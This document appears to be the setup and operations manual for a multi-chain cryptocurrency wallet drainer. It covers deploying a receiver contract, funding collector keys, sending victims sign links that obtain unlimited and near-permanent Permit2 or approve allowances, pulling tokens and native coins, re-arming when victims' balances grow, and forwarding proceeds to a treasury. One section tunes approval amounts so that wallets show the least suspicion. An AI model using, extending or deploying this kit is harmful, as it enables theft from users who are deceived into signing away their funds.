Setup
1. Set MASTER_KEY (32 bytes hex). Back it up.
2. Start the server, log in as super admin, open /admin/drainer.html.
3. Generate one key per family and POST them via "Collector keys". The EVM key must hold
   native gas on every chain you intend to drain; the Solana key holds SOL for fees; the
   Tron key holds TRX + energy.
3a. Set a **Payout sink** per family (treasury or multisig). Setting a key only defaults
   the payout when none exists, so rotating a hot key never silently moves the sink.
   Enable "Auto-forward leftovers" so anything landing on the collector is pushed on.
4. Deploy the receiver. The compiled artifact (contracts/DrainerReceiver.json) is
   committed, so no compiler is needed. From Admin → Drainer → Setup click
   "Deploy missing receivers (all mainnets)", or deploy per chain in the same
   section. Each deploy verifies owner + payout on-chain before it is recorded.
   CLI equivalent: python scripts/deploy_receiver.py [--testnet].
   To rebuild the artifact from source: click "Compile receiver artifact"
   (needs py-solc-x) or run solc --optimize and rebuild the JSON.
5. Check the registry before trusting it:
   python scripts/verify_networks.py --testnet
   It confirms RPC chain ids, Multicall3 + Permit2 deployment, and stablecoin symbols/decimals.

Chains
EVM mainnets: Ethereum, Base, Arbitrum, Optimism, Polygon, BSC, Avalanche, Linea, Scroll,
              zkSync, Mantle, Gnosis, Celo, Fantom, Berachain, Sonic, Unichain, Worldchain,
              HyperEVM, Mode, opBNB.
EVM testnets: Sepolia, BaseSepolia, ArbitrumSepolia (excluded from default scans/deploys;
              set EVM_INCLUDE_TESTNETS=1 or list them on the wallet).
Solana      : SPL / Token-2022 delegate, native SOL in the onboarding tx.
Tron        : TRC-20 approve + transferFrom, native TRX.
BTC / LTC   : watch-only; no approvals exist on UTXO chains.

Adding a chain is one entry in py_server/chains.py (chainId, RPC, native symbol, USDC/USDT
addresses + decimals, explorer, Permit2 flag). Everything else — scanners, drainer, deploy
script, admin console, browser chain-switch list — reads from that registry.

Flow
1. Admin copies the sign link (`/sign.html?wallet=<id>`) from the drainer console
   (Sign links → Copy, or Re-sign which copies them automatically) and sends it.
2. The user opens it, reviews the per-asset cap, and signs. EVM Permit2 shows as a
   typed-data signature; approve mode is one `approve` tx per token.
3. The server confirms the approval transaction before marking the grant active.
4. Manual drain: super admin executes directly; an admin's request needs a second
   admin. Both honour an `Idempotency-Key` header.
5. The run preflights gas per chain, re-scans, pulls, and confirms every tx. Grants
   blocked by gas or an RPC failure are `skipped` (still active), not failed.
6. When a payout sink differs from the collector, leftovers are forwarded after a
   successful run.

Revocation
Users revoke at /approvals.html. Each revoke builds a real owner-signed transaction:
`Permit2.lockdown(token)` for Permit2 grants, `approve(spender, 0)` for approve
grants, SPL `Revoke` on Solana, `approve(spender, 0)` on Tron. The DB flips to
`revoked` only after the client reports the signature. Native coins have no
allowance and are not listed.

Re-arm
Used/revoked/expired grants are re-scanned every `drainer_rearm_hours` (default 6).
If a wallet gained balance, it is re-prepared and the user is notified with a new
sign link. Toggle with `drainer_auto_rearm`.

Fee modes
The sender inspects the latest block. baseFeePerGas present and non-zero -> EIP-1559
(maxFee = 2*base + priority). Otherwise a legacy gasPrice transaction (BSC, opBNB and other
fixed-price chains). Both paths use the per-chain chainId and an explicit gas-balance preflight.

Caps
Default is unlimited: the Permit2 amount is uint160 max, so a top-up after signing
can still be pulled without a re-sign. capped -> 1,000,000 * 10^dec, or balance*2
if the balance already exceeds that (a round number the wallet shows plainly).
Coverage defaults: min USD/asset 0, include-unpriced on — every priced asset is
taken, and unpriced tokens with a balance are labelled rather than skipped.

Wallet rendering, worst to best for suspicion:
  uint256 max + plain approve        -> "Unlimited", amber warning
  1,000,000 + plain approve          -> clean round number, no warning
  1,000,000 via Permit2              -> shows "Permit2", the Uniswap contract. Best.

Permit2 batching
One PermitBatch signature covers every token on a chain. Permit2 marks the nonce used on the
first spend, so the drain submits the whole signed batch in one permitAndPull transaction
(tokens[]/amounts[]). The batch is recorded as consumed; every later pull on it goes through
DrainerReceiver.pullPermit2(token, from, amount) with no new signature. Each grant stores the
exact signed batch JSON; record_signed recovers the signature against that stored batch, not a
rebuilt single-token message. A receiver deployed before pullPermit2 existed is refused at
prepare time — redeploy it.

Known limits
* Native ETH/BNB/POL/AVAX/MNT/TRX cannot be pulled by allowance. Taken in the onboarding
  signature when drainer_take_native is on, otherwise queued.
* Solana folds native into the same tx, so nothing is left behind there.
* BTC/LTC are watch-only; no approvals exist on UTXO chains.
* USDT-TRC20 needs approve(0) then approve(cap). Handled by emitting both.
* fee-on-transfer tokens may deliver less than the requested amount; the run records the
  requested amount and leaves the remainder in the wallet.
* A user can revoke any allowance from their wallet UI at any time. Re-run prepare to restore.
* Permit2 approvals expire only if you change PERMIT_DETAILS_FOREVER; default is ~8.9M years.
* Scanning cost scales with chains: EVM_LOG_CHUNKS, EVM_LOG_CONCURRENCY,
  EVM_RPC_CONCURRENCY, EVM_SCAN_CONCURRENCY and EVM_SCAN_TIMEOUT bound it. Free publicnode
  endpoints throttle per IP across every subdomain — use paid RPC_<CHAIN> endpoints for a
  production drainer, and ALCHEMY_KEY to replace log walking on supported chains.
* A full 21-chain scan takes roughly 15s warm and ~20s on the first run after boot; the
  server pre-opens every RPC connection at startup.
